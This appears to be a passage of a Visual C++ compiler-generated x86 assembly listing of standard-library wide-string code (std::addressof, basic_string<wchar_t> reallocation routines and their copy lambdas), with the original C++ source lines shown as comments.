;	COMDAT ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@ABV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@ABV10@@Z PROC ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@ABV10@@Z ENDP ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
_<_Args_1>$ = 20					; size = 4
??$_Reallocate_grow_by@V<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_2fb699096920f2dc628cb0826b07831d>,wchar_t const *,unsigned int>, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 07	 cmp	 DWORD PTR __Old_capacity$[ebp], 7
  00099	76 4b		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	8b 4d 14	 mov	 ecx, DWORD PTR _<_Args_1>$[ebp]
  000a6	51		 push	 ecx
  000a7	8b 55 10	 mov	 edx, DWORD PTR _<_Args_0>$[ebp]
  000aa	52		 push	 edx
  000ab	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  000ae	50		 push	 eax
  000af	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000b2	51		 push	 ecx
  000b3	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  000b8	83 c4 04	 add	 esp, 4
  000bb	50		 push	 eax
  000bc	8b 55 d8	 mov	 edx, DWORD PTR __Raw_new$[ebp]
  000bf	52		 push	 edx
  000c0	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000c3	e8 00 00 00 00	 call	 ??R<lambda_2fb699096920f2dc628cb0826b07831d>@@QBE@QA_WQB_WI1I@Z ; <lambda_2fb699096920f2dc628cb0826b07831d>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c8	8b 45 e4	 mov	 eax, DWORD PTR __Old_capacity$[ebp]
  000cb	50		 push	 eax
  000cc	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000cf	51		 push	 ecx
  000d0	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  000d3	52		 push	 edx
  000d4	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
  000d9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000dc	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  000df	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000e2	89 08		 mov	 DWORD PTR [eax], ecx

; 4832 :         } else {

  000e4	eb 2c		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000e6	8b 55 14	 mov	 edx, DWORD PTR _<_Args_1>$[ebp]
  000e9	52		 push	 edx
  000ea	8b 45 10	 mov	 eax, DWORD PTR _<_Args_0>$[ebp]
  000ed	50		 push	 eax
  000ee	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  000f1	51		 push	 ecx
  000f2	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  000f5	52		 push	 edx
  000f6	8b 45 d8	 mov	 eax, DWORD PTR __Raw_new$[ebp]
  000f9	50		 push	 eax
  000fa	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000fd	e8 00 00 00 00	 call	 ??R<lambda_2fb699096920f2dc628cb0826b07831d>@@QBE@QA_WQB_WI1I@Z ; <lambda_2fb699096920f2dc628cb0826b07831d>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00102	8d 4d f0	 lea	 ecx, DWORD PTR __New_ptr$[ebp]
  00105	51		 push	 ecx
  00106	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00109	52		 push	 edx
  0010a	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
  0010f	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  00112	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  00115	8b e5		 mov	 esp, ebp
  00117	5d		 pop	 ebp
  00118	c2 10 00	 ret	 16			; 00000010H
??$_Reallocate_grow_by@V<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_2fb699096920f2dc628cb0826b07831d>,wchar_t const *,unsigned int>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_2fb699096920f2dc628cb0826b07831d>@@QBE@QA_WQB_WI1I@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -2						; size = 2
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Ptr$ = 20						; size = 4
__Count$ = 24						; size = 4
??R<lambda_2fb699096920f2dc628cb0826b07831d>@@QBE@QA_WQB_WI1I@Z PROC ; <lambda_2fb699096920f2dc628cb0826b07831d>::operator(), COMDAT
; _this$ = ecx

; 3323 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  00009	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);

  0001d	8b 45 18	 mov	 eax, DWORD PTR __Count$[ebp]
  00020	50		 push	 eax
  00021	8b 4d 14	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00024	51		 push	 ecx
  00025	8b 55 10	 mov	 edx, DWORD PTR __Old_size$[ebp]
  00028	8b 45 08	 mov	 eax, DWORD PTR __New_ptr$[ebp]
  0002b	8d 0c 50	 lea	 ecx, DWORD PTR [eax+edx*2]
  0002e	51		 push	 ecx
  0002f	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  00034	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  00037	33 d2		 xor	 edx, edx
  00039	66 89 55 fe	 mov	 WORD PTR $T1[ebp], dx
  0003d	8d 45 fe	 lea	 eax, DWORD PTR $T1[ebp]
  00040	50		 push	 eax
  00041	8b 4d 10	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00044	03 4d 18	 add	 ecx, DWORD PTR __Count$[ebp]
  00047	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  0004a	8d 04 4a	 lea	 eax, DWORD PTR [edx+ecx*2]
  0004d	50		 push	 eax
  0004e	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00053	83 c4 08	 add	 esp, 8

; 3323 :             },

  00056	8b e5		 mov	 esp, ebp
  00058	5d		 pop	 ebp
  00059	c2 14 00	 ret	 20			; 00000014H
??R<lambda_2fb699096920f2dc628cb0826b07831d>@@QBE@QA_WQB_WI1I@Z ENDP ; <lambda_2fb699096920f2dc628cb0826b07831d>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_for@V<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@Z
_TEXT	SEGMENT
__Al$ = -20						; size = 4
__Old_capacity$ = -16					; size = 4
__New_capacity$ = -12					; size = 4
__New_ptr$ = -8						; size = 4
_this$ = -4						; size = 4
__New_size$ = 8						; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
??$_Reallocate_for@V<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<<lambda_03628ca18370b1f44a99b655e704819b>,wchar_t const *>, COMDAT
; _this$ = ecx

; 4778 :     _CONSTEXPR20 basic_string& _Reallocate_for(const size_type _New_size, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4779 :         // reallocate to store exactly _New_size elements, new buffer prepared by
; 4780 :         // _Fn(_New_ptr, _New_size, _Args...)
; 4781 :         if (_New_size > max_size()) {

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00011	39 45 08	 cmp	 DWORD PTR __New_size$[ebp], eax
  00014	76 05		 jbe	 SHORT $LN2@Reallocate

; 4782 :             _Xlen_string(); // result too long

  00016	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4783 :         }
; 4784 : 
; 4785 :         const size_type _Old_capacity = _Mypair._Myval2._Myres;

  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b 48 14	 mov	 ecx, DWORD PTR [eax+20]
  00021	89 4d f0	 mov	 DWORD PTR __Old_capacity$[ebp], ecx

; 4786 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  00024	8b 55 08	 mov	 edx, DWORD PTR __New_size$[ebp]
  00027	52		 push	 edx
  00028	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002b	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00030	89 45 f4	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4787 :         auto& _Al                     = _Getal();

  00033	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00036	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0003b	89 45 ec	 mov	 DWORD PTR __Al$[ebp], eax

; 4788 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  0003e	8d 45 f4	 lea	 eax, DWORD PTR __New_capacity$[ebp]
  00041	50		 push	 eax
  00042	8b 4d ec	 mov	 ecx, DWORD PTR __Al$[ebp]
  00045	51		 push	 ecx
  00046	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  0004b	83 c4 08	 add	 esp, 8
  0004e	89 45 f8	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4789 : 
; 4790 :         _Mypair._Myval2._Orphan_all();

  00051	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00054	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4791 :         _ASAN_STRING_REMOVE(*this);
; 4792 :         _Mypair._Myval2._Mysize = _New_size;

  00059	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0005c	8b 45 08	 mov	 eax, DWORD PTR __New_size$[ebp]
  0005f	89 42 10	 mov	 DWORD PTR [edx+16], eax

; 4793 :         _Mypair._Myval2._Myres  = _New_capacity;

  00062	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00065	8b 55 f4	 mov	 edx, DWORD PTR __New_capacity$[ebp]
  00068	89 51 14	 mov	 DWORD PTR [ecx+20], edx

; 4794 :         _Fn(_Unfancy(_New_ptr), _New_size, _Args...);

  0006b	8b 45 10	 mov	 eax, DWORD PTR _<_Args_0>$[ebp]
  0006e	50		 push	 eax
  0006f	8b 4d 08	 mov	 ecx, DWORD PTR __New_size$[ebp]
  00072	51		 push	 ecx
  00073	8b 55 f8	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00076	52		 push	 edx
  00077	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  0007c	83 c4 04	 add	 esp, 4
  0007f	50		 push	 eax
  00080	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  00083	e8 00 00 00 00	 call	 ??R<lambda_03628ca18370b1f44a99b655e704819b>@@QBE@QA_WIQB_W@Z ; <lambda_03628ca18370b1f44a99b655e704819b>::operator()

; 4795 :         if (_Old_capacity > _Small_string_capacity) {

  00088	83 7d f0 07	 cmp	 DWORD PTR __Old_capacity$[ebp], 7
  0008c	76 20		 jbe	 SHORT $LN3@Reallocate

; 4796 :             _Deallocate_for_capacity(_Al, _Mypair._Myval2._Bx._Ptr, _Old_capacity);

  0008e	8b 45 f0	 mov	 eax, DWORD PTR __Old_capacity$[ebp]
  00091	50		 push	 eax
  00092	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00095	8b 11		 mov	 edx, DWORD PTR [ecx]
  00097	52		 push	 edx
  00098	8b 45 ec	 mov	 eax, DWORD PTR __Al$[ebp]
  0009b	50		 push	 eax
  0009c	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
  000a1	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4797 :             _Mypair._Myval2._Bx._Ptr = _New_ptr;

  000a4	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000a7	8b 55 f8	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  000aa	89 11		 mov	 DWORD PTR [ecx], edx

; 4798 :         } else {

  000ac	eb 10		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4799 :             _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);

  000ae	8d 45 f8	 lea	 eax, DWORD PTR __New_ptr$[ebp]
  000b1	50		 push	 eax
  000b2	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000b5	51		 push	 ecx
  000b6	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
  000bb	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4800 :         }
; 4801 : 
; 4802 :         _ASAN_STRING_CREATE(*this);
; 4803 :         return *this;

  000be	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4804 :     }

  000c1	8b e5		 mov	 esp, ebp
  000c3	5d		 pop	 ebp
  000c4	c2 0c 00	 ret	 12			; 0000000cH
??$_Reallocate_for@V<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<<lambda_03628ca18370b1f44a99b655e704819b>,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_03628ca18370b1f44a99b655e704819b>@@QBE@QA_WIQB_W@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -2						; size = 2
__New_ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
__Ptr$ = 16						; size = 4
??R<lambda_03628ca18370b1f44a99b655e704819b>@@QBE@QA_WIQB_W@Z PROC ; <lambda_03628ca18370b1f44a99b655e704819b>::operator(), COMDAT
; _this$ = ecx

; 3427 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);

  00009	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 10	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  0001d	33 c0		 xor	 eax, eax
  0001f	66 89 45 fe	 mov	 WORD PTR $T1[ebp], ax
  00023	8d 4d fe	 lea	 ecx, DWORD PTR $T1[ebp]
  00026	51		 push	 ecx
  00027	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  0002a	8b 45 08	 mov	 eax, DWORD PTR __New_ptr$[ebp]
  0002d	8d 0c 50	 lea	 ecx, DWORD PTR [eax+edx*2]
  00030	51		 push	 ecx
  00031	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00036	83 c4 08	 add	 esp, 8

; 3427 :             },

  00039	8b e5		 mov	 esp, ebp
  0003b	5d		 pop	 ebp
  0003c	c2 0c 00	 ret	 12			; 0000000cH
??R<lambda_03628ca18370b1f44a99b655e704819b>@@QBE@QA_WIQB_W@Z ENDP ; <lambda_03628ca18370b1f44a99b655e704819b>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@_W@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@_W@std@@@0@AAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@_W@std@@@0@AAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
